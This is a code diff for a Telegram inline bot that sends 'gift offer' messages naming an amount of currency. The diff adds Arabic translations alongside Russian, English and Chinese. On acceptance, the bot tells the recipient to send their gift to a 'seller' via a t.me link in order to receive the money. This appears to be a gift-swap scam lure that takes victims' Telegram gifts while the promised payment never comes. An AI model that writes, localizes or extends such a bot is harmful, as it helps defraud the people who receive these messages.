@@ -1124,18 +1124,25 @@ export default {
 
         let lang = "ru";
 
+        // Обработка языков
         if (
           textQuery.includes("eng") ||
           textQuery.includes("en ")
         ) {
           lang = "en";
-          textQuery = textQuery.replace(/eng/g, "").trim();
+          textQuery = textQuery.replace(/eng/g, "").replace(/en /g, "").trim();
         } else if (
           textQuery.includes("cn") ||
           textQuery.includes("中文")
         ) {
           lang = "cn";
-          textQuery = textQuery.replace(/cn/g, "").trim();
+          textQuery = textQuery.replace(/cn/g, "").replace(/中文/g, "").trim();
+        } else if (
+          textQuery.includes("ar") ||
+          textQuery.includes("arabic")
+        ) {
+          lang = "ar";
+          textQuery = textQuery.replace(/arabic/g, "").replace(/ar/g, "").trim();
         }
 
         const allNums = textQuery.match(/\d+/g);
@@ -1215,6 +1222,16 @@ export default {
           btnAccept = "接受";
           btnDecline = "拒绝";
           titleText = `报价: ${amount} ${currencyDisplay}`;
+
+        } else if (lang === "ar") {
+          text =
+            `<b>عرض هدية</b>\n\n` +
+            `تم تقديم لك <b>${amount} ${currencyDisplay}</b>\n` +
+            `${giftLink}`;
+
+          btnAccept = "قبول";
+          btnDecline = "رفض";
+          titleText = `عرض: ${amount} ${currencyDisplay}`;
 
         } else {
           text =
@@ -1877,11 +1894,17 @@ export default {
           };
 
           if (action === "acc") {
-            await answerCallback(
-              cq.id,
-              "Оффер принят ✅",
-              true
-            );
+            
+            // ИСПРАВЛЕНИЕ: Уведомления на нужном языке
+            if (lang === "en") {
+              await answerCallback(cq.id, "Offer accepted ✅", true);
+            } else if (lang === "cn") {
+              await answerCallback(cq.id, "已接受报价 ✅", true);
+            } else if (lang === "ar") {
+              await answerCallback(cq.id, "تم قبول العرض ✅", true);
+            } else {
+              await answerCallback(cq.id, "Оффер принят ✅", true);
+            }
 
             const finalUrl =
               "https://t.me/" + targetReceiver;
@@ -1914,6 +1937,20 @@ export default {
                 ]]
               };
 
+            } else if (lang === "ar") {
+              newText =
+                `✅ <b>مقبول</b>\n\n` +
+                `لتلقي <b>${amount} ${displayCurrency}</b>، يرجى إرسال الهدية إلى البائع.`;
+
+              newMarkup = {
+                inline_keyboard: [[
+                  {
+                    text: "إرسال الهدية",
+                    url: finalUrl
+                  }
+                ]]
+              };
+
             } else {
               newText =
                 `✅ <b>Принято</b>\n\n` +
@@ -1930,13 +1967,26 @@ export default {
             }
 
           } else {
-            await answerCallback(cq.id);
+            // Отклонение
+            if (lang === "en") {
+              await answerCallback(cq.id, "Offer declined ❌", true);
+            } else if (lang === "cn") {
+              await answerCallback(cq.id, "已拒绝报价 ❌", true);
+            } else if (lang === "ar") {
+              await answerCallback(cq.id, "تم رفض العرض ❌", true);
+            } else {
+              await answerCallback(cq.id, "Оффер отклонен ❌", true);
+            }
 
-            newText = lang === "en"
-              ? "❌ <b>Declined</b>"
-              : lang === "cn"
-                ? "❌ <b>已拒绝</b>"
-                : "❌ <b>Отклонено</b>";
+            if (lang === "en") {
+              newText = "❌ <b>Declined</b>";
+            } else if (lang === "cn") {
+              newText = "❌ <b>已拒绝</b>";
+            } else if (lang === "ar") {
+              newText = "❌ <b>مرفوض</b>";
+            } else {
+              newText = "❌ <b>Отклонено</b>";
+            }
           }
 
           if (cq.inline_message_id) {
